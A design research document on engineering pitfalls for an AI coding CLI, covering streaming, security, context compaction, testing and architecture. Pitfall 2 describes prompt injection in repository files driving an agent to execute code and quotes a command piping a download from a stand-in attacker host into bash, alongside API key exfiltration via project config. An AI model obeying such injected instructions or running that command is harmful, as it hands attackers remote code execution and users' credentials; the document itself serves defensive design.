# Pitfalls Research

**Domain:** AI Coding CLI — TUI-based multi-provider LLM agent with extension system
**Researched:** 2026-04-15
**Confidence:** HIGH (empirical study + CVE disclosures + production post-mortems)

---

## Critical Pitfalls

### Pitfall 1: Streaming Partial Response Mishandling

**What goes wrong:**
SSE streams deliver tool call arguments as incremental chunks. Systems that parse each chunk as a complete JSON object crash or produce corrupted tool calls. Codex 0.64.0 treated each character of a streaming tool call argument as a separate tool call. OpenClaw crashes with partial JSON parse errors on non-ASCII characters mid-stream. Google ADK returns empty text after AgentTool calls when streaming is enabled but the accumulation buffer isn't flushed on tool boundaries.

**Why it happens:**
Developers test streaming with models that deliver complete tool calls in one chunk at low load. Under real load, chunk boundaries fall mid-JSON. The parser works in the happy path and breaks under chunking variance, network jitter, or provider-specific framing differences (some providers emit `progress_notice` events that must be discarded, not errored on).

**How to avoid:**
Maintain a stateful accumulation buffer per stream. Parse incrementally using a streaming JSON parser (not `JSON.parse` on each chunk). Treat unknown SSE event types as ignorable, not fatal. Test with a mock that delivers tool call arguments one character at a time. Never assume a single SSE event = one complete logical unit.

**Warning signs:**
- Tool calls occasionally fail with "unexpected token" parse errors
- Agent works with one provider but not another
- Tests pass with mocked single-chunk responses but fail against real API
- Different behavior on slow vs fast network

**Phase to address:** Core LLM integration — before multi-provider support is wired up. Get the streaming buffer right once with one provider, then verify all others against the same buffer.

---

### Pitfall 2: Prompt Injection to Remote Code Execution

**What goes wrong:**
Attackers embed instructions in files the agent reads — code comments, git history, `package.json` description fields, README files in malicious repos. The LLM obeys the injected instruction. Because the agent has shell execution capability, this becomes RCE. Trail of Bits documented this chain: injected prompt tells agent to run `go test -exec 'bash -c "curl c2-server.evil.com | bash"'`. The agent runs `go test` — an allowlisted command — with attacker-controlled arguments. CVE-2025-59536 exploited Claude Code project hooks for API key exfiltration when users cloned untrusted repos.

**Why it happens:**
Tools are allowlisted at the command level (`find`, `grep`, `go test`) without validating arguments. The model cannot distinguish "instructions from the user" from "instructions embedded in project files." Attack success rates of 41–84% have been measured across Cursor and GitHub Copilot using a 314-payload framework covering 70 MITRE ATT&CK techniques.

**How to avoid:**
Use `--` argument separators in all tool invocations to prevent flag injection. Disable `shell: true` in Node.js `exec`/`spawn` — use argument arrays. Sandbox bash execution with filesystem and network containment (project root only, no egress to arbitrary hosts). Flag content entering LLM context from untrusted sources (file reads from outside project root, package metadata). Treat `.claude/settings.json` and equivalent hook files in cloned repos as untrusted until user confirms.

**Warning signs:**
- Shell commands built by string concatenation rather than argument arrays
- `exec(command, { shell: true })` anywhere in tool execution
- Agent reads arbitrary files from cloned repos before showing a trust prompt
- No distinction between user-authored text and file-read content in the LLM message

**Phase to address:** Tool system implementation — before bash tool is enabled. Filesystem containment and argument safety must ship with the first working bash tool, not as a follow-up hardening pass.

---

### Pitfall 3: Extension Becomes the Product

**What goes wrong:**
Extensions start as isolated features. Developers add cross-cutting concerns — state, rendering, tool definitions, provider logic — to the extension because it's faster than adding proper core abstractions. The extension grows to be the largest package in the repository. Other packages start importing from it. At 88K lines across 303 files (GSD-2 upstream), the extension IS the product and the supposed "core" is a shell. This is the upstream failure mode Cauldron exists to fix.

**Why it happens:**
Extensions have access to the extension API surface, which expands over time. Each "just add it here" decision is locally rational. The problem is systemic: without hard limits on what extensions can import and a rule that core abstractions live in core packages, gravity pulls everything into the extension slot.

**How to avoid:**
Enforce at build time: extensions may only import from declared `@get-cauldron/*` public APIs, never from other extension internals, never from core `src/` paths. CI fails on any import that crosses this boundary. Set a file count and line count limit on extensions enforced by linting. If an extension needs something that doesn't exist in core, the answer is "add it to core with a proper API," not "put it in the extension."

**Warning signs:**
- Extension package growing faster than core packages
- Any `import ... from '../../../packages/core/src/...'` in extension code (raw src imports)
- Extension package has the highest circular dependency count in the graph
- New features default to "add to extension" without discussion

**Phase to address:** Extension API design — the isolation boundary must be defined before any extension code is written. This is a foundation decision.

---

### Pitfall 4: API Credentials Leaked via Environment Variable Inheritance

**What goes wrong:**
AI coding tools automatically load `.env` files and inherit environment variables from the shell. When the agent runs tools — including "safe" ones like `echo` or `env` — those tools can expose `ANTHROPIC_API_KEY` and other secrets. Claude Code loaded `.env` files silently before showing any trust prompt, allowing a malicious repo's `ANTHROPIC_BASE_URL` override to redirect API calls (and keys) to an attacker-controlled endpoint. GitGuardian found 28.6 million secrets exposed in public GitHub commits in 2025, with AI-assisted commits leaking at roughly double the baseline rate.

**Why it happens:**
Environment variables are a convenient way to configure tools. The problem is that child processes inherit the full parent environment, so any subprocess the agent spawns can read API keys. Tool developers treat env vars as configuration, not secrets requiring explicit scrubbing.

**How to avoid:**
Scrub `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, and equivalent secrets from the subprocess environment before spawning any tool. Store credentials in a separate secure store (chmod 0o600, file locking) rather than environment variables where possible. Show a trust prompt before loading project-level configuration from cloned repos. Never load provider configuration from untrusted project files before the trust checkpoint.

**Warning signs:**
- Tool execution using `process.env` directly passed to `spawn` options
- No `env` scrubbing in bash tool implementation
- `.env` file auto-loading without a trust prompt for new project directories
- API key visible in `printenv` output after agent initialization

**Phase to address:** Core authentication and tool system — parallel concern. Credential store design must precede tool system implementation.

---

### Pitfall 5: Context Pollution Without Compaction

**What goes wrong:**
Long agent sessions accumulate tool outputs, intermediate reasoning, and conversation history in the context window. Even with 200K+ token windows, the model's effective performance degrades before the hard limit — not from truncation, but from relevance dilution. "Context pollution" means earlier critical decisions are crowded out by voluminous recent tool outputs (e.g., a 50-line grep result repeated 12 times across a session). Artifact tracking degrades: compaction methods score 2.19–2.45/5.0 on remembering file modifications across summarization boundaries.

**Why it happens:**
Developers implement streaming and session management first, then discover the context length problem only when users report "the agent forgot what we decided earlier." Compaction is treated as optimization, not architecture.

**How to avoid:**
Design compaction as a first-class session concern from the start. Implement reversible compaction: strip tool outputs that are redundant because the result exists in the filesystem (the agent can re-read files). Preserve decision summaries and architectural choices in a structured persistent note outside the context window. Use a budget tracker that signals MEDIUM/LOW/CRITICAL context states so the agent can self-compact before hitting the limit.

**Warning signs:**
- Agent "forgets" earlier decisions in long sessions
- Context window approaching limit triggers sudden quality degradation rather than graceful compaction
- Session state is only the raw message array with no summarization layer
- No distinction between ephemeral tool outputs and persistent decisions in the message store

**Phase to address:** Agent session management — design compaction strategy before the session loop is finalized.

---

### Pitfall 6: Silent Error Swallowing Masking Production Failures

**What goes wrong:**
Upstream GSD-2 has 231+ instances of silent error swallowing. The pattern: `try { ... } catch { }` or `.catch(() => {})` or returning `undefined` on failure instead of throwing. The agent continues running. Tool calls appear to succeed. Downstream steps operate on corrupted state. The user sees no error; the agent just produces wrong output. A March 2025 study found error propagation — silent mistakes corrupting subsequent reasoning steps — is the primary bottleneck in production agent reliability.

**Why it happens:**
Error handling is added last. Developers suppress errors to prevent UI crashes during development. The suppression stays in production. With LLMs, wrong output looks like "the model wasn't sure" rather than "the tool threw."

**How to avoid:**
Ban `catch(() => {})` and bare `catch {}` via ESLint rule (`no-empty`, `@typescript-eslint/no-empty-function`). Tool errors must propagate to the LLM as structured error results — not silently return empty. Establish an error taxonomy: recoverable (retry), fatal (surface to user), or soft-fail (return structured error to model). Log every suppressed error at WARN level minimum with a stack trace.

**Warning signs:**
- `catch` blocks with no body or only a comment
- Functions that return `null | undefined` on failure where the caller doesn't check
- Tool returning an empty array that downstream treats as "no results" instead of "error"
- No error rate monitoring — all observable metrics show "healthy" while output quality degrades

**Phase to address:** Foundation — establish linting rules before any tool or session code is written.

---

### Pitfall 7: TUI Rendering Breaks Across Terminal Environments

**What goes wrong:**
TUI code that works in iTerm2 on macOS produces garbage characters in SSH sessions, Windows Terminal, or tmux. The failure modes are: ANSI escape sequences not supported, color depth assumptions wrong (truecolor in local, 256 in SSH, 8-color in some CI), terminal width detection returning wrong value in non-interactive contexts, resize events not handled (SIGWINCH), and raw mode leaving the terminal corrupted on crash.

**Why it happens:**
Development happens in one terminal emulator. Testing happens in one terminal emulator. The failure surface is only visible when users report "the UI is broken." Resize handling is often added after initial rendering, and crash cleanup (restoring terminal state) is forgotten entirely.

**How to avoid:**
Check `process.stdout.isTTY` before assuming any terminal capability. Use `process.env.COLORTERM`, `process.env.TERM`, and `$TERM_PROGRAM` to detect color depth, then degrade gracefully. Implement SIGWINCH handler from day one. Use `process.on('exit', cleanup)` and `process.on('SIGINT', cleanup)` to restore raw mode. Test in at least: local terminal, SSH, tmux, Windows Terminal (via CI matrix).

**Warning signs:**
- No `isTTY` guard in rendering code
- Color codes hardcoded without environment detection
- Crash leaves terminal in raw mode (user types and sees nothing or garbled output)
- Resize causes layout corruption that only clears on next keypress

**Phase to address:** TUI rendering layer — the rendering pipeline must include capability detection and cleanup before any interactive feature is built.

---

### Pitfall 8: Mutable Singleton State in Session Management

**What goes wrong:**
Global singletons accumulate session state — provider config, tool registry, conversation history — in module-level variables. This works for a single interactive session. It breaks when: multiple sessions run concurrently, tests share module state between test cases (producing order-dependent test failures), or the session is "restarted" without the singleton being reset. GSD-2 upstream has 8 mutable singletons in `gsd-db.ts` alone.

**Why it happens:**
Singletons are the simplest way to share state. They work during initial development. The problem surfaces late — when you add concurrency, when tests start flaking, when restart doesn't fully clear state.

**How to avoid:**
Pass session state explicitly as function arguments or through a session context object. Module-level state should be immutable configuration, not mutable session data. Each session creates its own state instance. Tests create isolated instances per test case, with no shared module-level mutation.

**Warning signs:**
- `let currentSession = null` at module scope
- Tests that pass in isolation but fail when run in sequence
- "Restart session" that requires process restart to fully take effect
- Race conditions appearing when running agent in parallel tasks

**Phase to address:** Agent session management — the session state model must be explicit and injectable before any feature that uses session state is built.

---

### Pitfall 9: Build System Compensating for Broken Architecture

**What goes wrong:**
When package boundaries are violated, the build fails with type errors. The fix is: add `ignoreBuildErrors: true`, source/dist fallback loaders, `skipLibCheck: true`, path aliases that bypass real package resolution. Each hack fixes the immediate error and hides the underlying boundary violation. The architecture is now broken AND the build system lies about it. GSD-2 upstream reached a state where the build passed while the architecture had 99 circular dependencies and fictional package boundaries.

**Why it happens:**
TypeScript's project references are strict but verbose to set up. Easier to add a `paths` alias or `skipLibCheck` than to properly define package APIs. Each shortcut is individually justifiable. Collectively they make architecture invisible to the build.

**How to avoid:**
No `ignoreBuildErrors`. No `skipLibCheck`. No source/dist fallback loaders. TypeScript project references must be used and must accurately reflect the dependency graph. If a build error reveals a boundary violation, fix the boundary — don't suppress the error. CI must run `tsc --noEmit` without any suppression flags.

**Warning signs:**
- `skipLibCheck: true` in any tsconfig
- `paths` aliases that point to `src/` of another package
- Custom require hooks or webpack loaders that resolve packages
- Build passes but runtime import fails

**Phase to address:** Monorepo foundation — these rules must be set before any package code is written. Retrofitting is painful; establishing them first is free.

---

### Pitfall 10: Non-Deterministic Tests Against Live LLM APIs

**What goes wrong:**
Tests call real LLM APIs. The model response varies across runs. Token counts change with model updates. Rate limits cause flaky failures in CI. Tests that "pass" most of the time hide real regressions because failures are attributed to "model variance" rather than code bugs. The test suite becomes a liability — it catches nothing reliably and costs money on every run.

**Why it happens:**
Integration tests against real APIs feel more "real." The non-determinism only becomes obvious after 50 test runs. Rate limit flakiness appears only in CI under parallel execution.

**How to avoid:**
Record/playback fixtures for all LLM interactions: in record mode, run against real API and save the full SSE transcript; in playback mode, serve the saved transcript deterministically. Separate the test suite into: (1) unit tests with mocked LLM responses — always deterministic, (2) integration tests with recorded fixtures — deterministic replay, (3) live tests against real APIs — run manually or on a slow schedule, not in every PR CI. Use temperature=0 for any live test that must be repeatable.

**Warning signs:**
- Tests marked `skip` or `todo` because "LLM is inconsistent"
- CI job occasionally fails with "rate limit exceeded" in test output
- Different developers see different test results on the same code
- Test assertions use `expect(result).toContain(...)` instead of structural checks because exact output varies

**Phase to address:** Testing foundation — establish the record/playback layer before writing any agent tests. All subsequent test code is built on it.

---

### Pitfall 11: Tool API Design Lock-In

**What goes wrong:**
The extension tool API is shipped before its design is validated. Extensions register tools with one interface. Later, core needs to add capabilities (sandboxing, timeout, progress reporting) that require changing the tool registration API. Breaking change. All extensions break. The API that seemed complete wasn't — it just hadn't been used for anything complex yet. Eclipse's plugin architecture is the canonical example: once published, APIs are nearly impossible to modify because thousands of plugins depend on them.

**Why it happens:**
APIs are designed to cover known use cases. Unknown use cases require capabilities that weren't anticipated. The more users there are, the more painful the breaking change becomes.

**How to avoid:**
Design the tool API around an options object, not positional arguments — options objects are backward-compatible by default. Version the tool API explicitly from day one. Dogfood the API by implementing all built-in tools (read, write, edit, grep, bash) through the same extension API that third-party tools will use. If built-in tools need capabilities the API doesn't have, add them before launch.

**Warning signs:**
- Built-in tools bypassing the extension tool registration API
- Tool API uses positional arguments: `registerTool(name, description, schema, handler)`
- No version field in tool registration — impossible to add breaking changes later
- First extension developer discovers missing capabilities that can only be added via breaking change

**Phase to address:** Extension API design — dogfood with built-in tools before any third-party extension support is documented.

---

### Pitfall 12: Rate Limit Cascade Without Backpressure

**What goes wrong:**
The agent fires multiple concurrent tool calls, then submits all results in one LLM request. If any tool call is slow, the context grows while waiting. If the LLM API rate limits the subsequent call, naive retry logic hammers the provider and exhausts retry budget before the backoff completes. Multi-provider fallback without per-provider state means the fallback provider also gets hammered in the same pattern.

**Why it happens:**
Parallel tool execution is a legitimate optimization. Backpressure is added later, after rate limiting becomes a problem in production. Per-provider state tracking (remaining quota, backoff timer) is complex and skipped in early implementations.

**How to avoid:**
Implement exponential backoff with jitter from the first provider integration — not as a retrofit. Per-provider rate limit state: track remaining requests/tokens per minute window and preemptively throttle before hitting the limit. Multi-provider fallback must reset the backoff timer per provider, not share one global timer. Limit concurrent tool execution to a configurable parallelism cap.

**Warning signs:**
- Retry logic uses fixed delays: `await sleep(1000); retry()`
- No per-provider quota tracking
- Concurrent tool calls with no parallelism cap
- Rate limit errors spike but are treated as transient rather than triggering backoff

**Phase to address:** LLM provider integration — implement backpressure with the first provider, verify it extends correctly to subsequent providers.

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| `skipLibCheck: true` | Fixes build errors from bad package boundaries | Hides circular deps, makes architecture invisible to build | Never |
| `catch (() => {})` | Prevents crash during development | Silent failures in production, impossible to debug | Never |
| Singleton session state at module scope | Simple to implement | Order-dependent tests, no concurrency, restart doesn't clear | Never |
| Raw src imports across packages (`../../packages/core/src/`) | Faster to wire up feature | Fictional package boundaries, circular deps accumulate | Never |
| Testing against live LLM APIs without fixtures | Feels more real | Flaky CI, expensive, hides regressions behind "model variance" | Manual/scheduled runs only |
| Allowlist bash commands without argument validation | Easy to implement bash tool | Prompt injection → RCE escalation | Never — use sandboxing instead |
| Hardcode tool API with positional arguments | Simple initial API | Breaking changes required to add any new capability | Never |
| `ignoreBuildErrors: true` | Unblocks progress during prototyping | Suppresses all type errors, architecture invisible | Prototyping only, must be removed before first commit |

---

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| Anthropic SSE streaming | Parsing each SSE event as complete JSON | Maintain accumulation buffer; parse only when complete stop_reason received |
| Multi-provider switching | Sharing global retry/backoff state across providers | Per-provider state: quota window, backoff timer, request count |
| Provider auth configuration | Auto-loading `ANTHROPIC_BASE_URL` from project `.env` before trust prompt | Show trust prompt first; never load provider config from untrusted project files |
| Bash tool execution | `spawn(cmd, { shell: true })` with concatenated arguments | `spawn(cmd, [arg1, arg2], { shell: false })` with `--` separator |
| Model context protocol (MCP) | Trusting MCP server responses without sanitization | Flag MCP responses as untrusted external content before LLM context insertion |
| Subprocess environment | Passing full `process.env` to spawned tools | Scrub `*_API_KEY` entries from subprocess env object |
| Terminal color output | Hardcoding ANSI codes without checking `isTTY` | Check `isTTY`, `COLORTERM`, `TERM`; degrade to no-color fallback |

---

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| No streaming buffer flush on tool boundaries | Tool call results appear after long delay then all at once | Flush buffer on every `content_block_stop` event, not just stream end | Every session with tool use |
| Unbounded context growth | Session quality degrades after ~30 min, context limit errors | Compaction triggered at 70% window usage | Sessions > 10-15 tool calls |
| Eager TypeScript compilation of all packages on startup | CLI takes 3-5 seconds to start | Pre-compile to ESM dist; never load TS source at runtime | Any codebase > 50 files |
| Synchronous file reads in tool execution | Single large file read blocks event loop | Async file reads; stream large file contents | Files > 1MB |
| Re-checking all circular dependencies on every test run | CI takes 5x longer than needed | Cache dependency graph; invalidate on package.json changes only | > 20 packages |
| Loading all provider SDKs at startup | Slow startup even when only using one provider | Lazy-load provider SDK on first use per provider | When > 3 providers registered |

---

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| Prompt injection from file contents entering LLM context | Attacker-controlled instructions execute as user commands | Flag file-read content with trust marker; consider XML-delimited context injection |
| Shell execution with user/file-controlled arguments | RCE from argument injection | Argument arrays, `--` separator, sandbox with filesystem/network containment |
| API keys in subprocess environment | Credential exfiltration via "safe" tool like `echo` | Scrub key env vars before spawning any subprocess |
| Auto-trust of project-level config in cloned repos | Malicious hooks execute before trust prompt | Show trust prompt before reading `.claude/settings.json` or equivalent |
| Unrestricted filesystem access in tool system | Agent reads/writes outside project root | Hard containment: all file paths resolved against project root, paths outside rejected |
| Extension with access to full process environment | Rogue extension exfiltrates credentials | Extension sandbox: no `process.env` access, only declared capability grants |
| MCP server responses injected without sanitization | Indirect prompt injection via trusted-looking tool output | Mark external content source in LLM context; limit MCP server trust to explicit user grants |

---

## "Looks Done But Isn't" Checklist

- [ ] **SSE Streaming:** Works with mocked single-chunk responses — verify with character-at-a-time chunked mock and cross-provider real traffic
- [ ] **Bash Tool Security:** Tool executes commands — verify argument array (not string), `--` separator, subprocess env scrubbing, network egress block
- [ ] **Extension Isolation:** Extension loads and runs — verify import boundary enforcement in CI, no raw `src/` imports, no extension importing from other extension internals
- [ ] **Session Restart:** Session appears to reset — verify module-level singletons are not carrying state across restart, test with `session.reset()` mid-session
- [ ] **Context Compaction:** Context window shows size metrics — verify compaction triggers before limit, not at limit; verify artifact tracking survives compaction boundary
- [ ] **Terminal Cleanup:** TUI renders — verify raw mode is restored on SIGINT, SIGTERM, and uncaught exception; test by killing the process mid-session
- [ ] **Credential Safety:** Agent responds to user prompts — verify `printenv` in a bash tool does not show API keys; verify cloned repo `.env` loading requires trust prompt
- [ ] **Circular Dependency Enforcement:** Packages compile — verify `madge` or `dependency-cruiser` in CI with zero-tolerance rule; a passing build does not mean zero circular deps
- [ ] **Test Isolation:** Test suite passes — verify tests pass in random order; verify no shared module-level state between test cases
- [ ] **Rate Limit Recovery:** Agent retries on 429 — verify per-provider backoff state, verify fallback provider also has independent backoff, not shared global timer

---

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| Streaming buffer bug discovered in production | LOW | Add accumulation buffer, add chunked mock to test suite, re-test against all providers |
| Prompt injection enabling tool misuse | HIGH | Disable bash tool, audit all tool invocations for string-concatenated commands, add sandboxing, red-team before re-enabling |
| Extension has collapsed into core | VERY HIGH | Declare hard API surface, move logic out of extension to core packages one module at a time, add CI boundary check, enforce until clean |
| Silent error swallowing covering regression | MEDIUM | Add ESLint rule, identify all bare catch blocks (grep), add structured error logging, re-run against test suite looking for newly visible failures |
| Circular dependency count > 10 | HIGH | Freeze new features, run dependency-cruiser, break cycles bottom-up starting with leaf packages, add CI enforcement before unfreezing |
| Build system hacks suppressing type errors | HIGH | Remove suppression flags one at a time, fix revealed type errors before removing next flag; cannot be done in parallel |
| API key leaked via subprocess | MEDIUM | Rotate affected keys immediately, add env scrubbing, audit all `spawn`/`exec` calls, add test for env scrubbing |
| God file > 1000 lines | MEDIUM | Identify cohesive sub-modules within file, extract with clear public API, keep original as re-export shim until consumers are updated |

---

## Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| Streaming partial response mishandling | LLM integration (Phase 1) | Character-at-a-time chunked mock in test suite; cross-provider integration tests |
| Prompt injection → RCE | Tool system (Phase 2) | Red-team: can a file read trigger a shell command via injected prompt? |
| Extension becomes the product | Extension API design (Phase 3) | CI import boundary check passes with zero violations |
| API credential leakage | Auth + tool system (Phase 1/2) | `spawn` subprocess cannot read `ANTHROPIC_API_KEY` from env |
| Context pollution without compaction | Agent session (Phase 2) | 30-minute session test: agent still references earliest decisions accurately |
| Silent error swallowing | Foundation (Phase 0) | ESLint `no-empty` + `@typescript-eslint/no-empty-function` pass in CI |
| TUI rendering breaks | TUI pipeline (Phase 2) | Test matrix: iTerm2, SSH, tmux, Windows Terminal — no garbage output |
| Mutable singleton state | Agent session (Phase 2) | Tests pass in random order with no shared module state |
| Build system compensating for broken architecture | Monorepo foundation (Phase 0) | `tsc --noEmit` with `skipLibCheck: false` passes in CI |
| Non-deterministic tests | Testing foundation (Phase 0) | All CI tests use recorded fixtures; no live API calls in PR builds |
| Tool API lock-in | Extension API design (Phase 3) | All built-in tools use same registration API as third-party; API uses options objects |
| Rate limit cascade | LLM integration (Phase 1) | Load test: 10 concurrent sessions, all providers rate-limited — no cascade failures |

---

## Sources

- [Engineering Pitfalls in AI Coding Tools: Empirical Study of Bugs in Claude Code, Codex, and Gemini CLI](https://arxiv.org/html/2603.20847) — 3,864 bugs analyzed; 37.6% in tool/API orchestration layer
- [Prompt Injection to RCE in AI Agents — Trail of Bits](https://blog.trailofbits.com/2025/10/22/prompt-injection-to-rce-in-ai-agents/) — Attack chain documentation, prevention strategies
- [OWASP LLM01:2025 Prompt Injection](https://genai.owasp.org/llmrisk/llm01-prompt-injection/) — Attack surface taxonomy
- [Effective Context Engineering for AI Agents — Anthropic](https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents) — Anti-patterns in context management
- [CVE-2025-59536 — Claude Code RCE and API Key Exfiltration via Project Files](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/) — Real CVE showing credential leakage via project config
- [From .env to Leakage — Knostic](https://www.knostic.ai/blog/claude-cursor-env-file-secret-leakage) — Credential exposure via auto-loaded `.env`
- [Solving Context Window Overflow in AI Agents](https://arxiv.org/html/2511.22729v1) — Compaction strategy evaluation; artifact tracking scores
- [Why SSE for AI Agents Keeps Breaking at 2am](https://dev.to/abhishek_chatterjee_33b9d/why-sse-for-ai-agents-keeps-breaking-at-2am-55ie) — Streaming fragility patterns
- [Detecting Silent Failures in Multi-Agentic AI Trajectories](https://arxiv.org/pdf/2511.04032) — Silent error propagation as primary reliability bottleneck
- [Practical Security Guidance for Sandboxing Agentic Workflows — NVIDIA](https://developer.nvidia.com/blog/practical-security-guidance-for-sandboxing-agentic-workflows-and-managing-execution-risk/) — Sandboxing strategies for tool execution
- [GitGuardian 2025 Report — 29 Million Leaked Secrets from AI Agents](https://www.helpnetsecurity.com/2026/04/14/gitguardian-ai-agents-credentials-leak/) — Scale of credential leakage from AI coding tools
- [Testing AI Agents: Validating Non-Deterministic Behavior — SitePoint](https://www.sitepoint.com/testing-ai-agents-deterministic-evaluation-in-a-non-deterministic-world/) — Record/playback fixture strategy
- [Three Ways to Enforce Module Boundaries in Nx Monorepo](https://www.stefanos-lignos.dev/posts/nx-module-boundaries) — Dependency enforcement tooling

---
*Pitfalls research for: AI Coding CLI (Cauldron — fork of GSD-2)*
*Researched: 2026-04-15*
